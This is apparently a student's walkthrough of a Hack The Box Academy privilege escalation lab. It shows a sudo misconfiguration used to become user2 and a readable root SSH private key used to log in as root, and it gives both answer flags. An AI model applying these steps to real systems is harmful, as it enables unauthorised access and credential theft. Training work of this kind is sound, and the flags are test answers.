# Section 11: Privilege Escalation

Module: 02. Getting Started

---

## Questions & Answers

### 1. SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.

Context:
```bash
- SSH to 154.57.164.61 , with user "user1" and password "password1"

┌─[eu-academy-1]─[10.10.14.112]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ ssh user1@154.57.164.61 -p 30833
The authenticity of host '[154.57.164.61]:30833 ([154.57.164.61]:30833)' can't be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[154.57.164.61]:30833' (ED25519) to the list of known hosts.
(user1@154.57.164.61) Password: password1

user1@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:~$ sudo -l
Matching Defaults entries for user1 on
    ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on
        ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:
    (user2 : user2) NOPASSWD: /bin/bash
user1@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:~$ sudo -u user2 /bin/bash
user2@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:/home/user1$ cat /home/user2/flag.txt
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

**Answer:** `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`

---

### 2. Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.

Context:
```bash
user2@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:/$ ls -la
total 0
drwxr-xr-x.   1 root root   40 Jul 23 11:04 .
drwxr-xr-x.   1 root root   40 Jul 23 11:04 ..
lrwxrwxrwx.   1 root root    7 Jul 20  2020 bin -> usr/bin
drwxr-xr-x.   2 root root    6 Apr 15  2020 boot
drwxr-xr-x.   5 root root  340 Jul 23 11:04 dev
drwxr-xr-x.   1 root root   17 Feb 12  2021 etc
drwxr-xr-x.   1 root root   19 Feb 12  2021 home
lrwxrwxrwx.   1 root root    7 Jul 20  2020 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 Jul 20  2020 lib32 -> usr/lib32
lrwxrwxrwx.   1 root root    9 Jul 20  2020 lib64 -> usr/lib64
lrwxrwxrwx.   1 root root   10 Jul 20  2020 libx32 -> usr/libx32
drwxr-xr-x.   2 root root    6 Jul 20  2020 media
drwxr-xr-x.   2 root root    6 Jul 20  2020 mnt
drwxr-xr-x.   2 root root    6 Jul 20  2020 opt
dr-xr-xr-x. 687 root root    0 Jul 23 11:04 proc
drwxr-x---.   1 root user2  18 Feb 12  2021 root
drwxr-xr-x.   1 root root   66 Jul 23 11:08 run
lrwxrwxrwx.   1 root root    8 Jul 20  2020 sbin -> usr/sbin
drwxr-xr-x.   2 root root    6 Jul 20  2020 srv
dr-xr-xr-x.  13 root root    0 May 10 19:19 sys
drwxrwxrwt.   1 root root   28 Aug 19  2020 tmp
drwxr-xr-x.   1 root root   81 Jul 20  2020 usr
drwxr-xr-x.   1 root root   30 Aug 19  2020 var
user2@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:/$ ls -la /root
total 20
drwxr-x---. 1 root user2   18 Feb 12  2021 .
drwxr-xr-x. 1 root root    40 Jul 23 11:04 ..
-rwxr-x---. 1 root user2    5 Aug 19  2020 .bash_history
-rwxr-x---. 1 root user2 3106 Dec  5  2019 .bashrc
-rwxr-x---. 1 root user2  161 Dec  5  2019 .profile
drwxr-x---. 1 root user2   20 Feb 12  2021 .ssh
-rwxr-x---. 1 root user2 1309 Aug 19  2020 .viminfo
-rw-------. 1 root root    33 Feb 12  2021 flag.txt
user2@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:/$ ls -la /root/.ssh
total 12
drwxr-x---. 1 root user2   20 Feb 12  2021 .
drwxr-x---. 1 root user2   18 Feb 12  2021 ..
-rw-------. 1 root root   571 Feb 12  2021 authorized_keys
-rw-r--r--. 1 root root  2602 Feb 12  2021 id_rsa
-rw-r--r--. 1 root root   571 Feb 12  2021 id_rsa.pub
user2@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:/$ cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
# ...
-----END OPENSSH PRIVATE KEY-----

┌─[eu-academy-1]─[10.10.14.112]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ ssh root@154.57.164.61 -p 30833 -i id_rsa 
root@ng-2162140-gettingstartedprivesc-9byao-85bc4dccd-4bxmz:~# cat /root/flag.txt
HTB{pr1v1l363_35c4l4710n_2_r007}
```

**Answer:** `HTB{pr1v1l363_35c4l4710n_2_r007}`

---

[Back to Module Index](./README.md)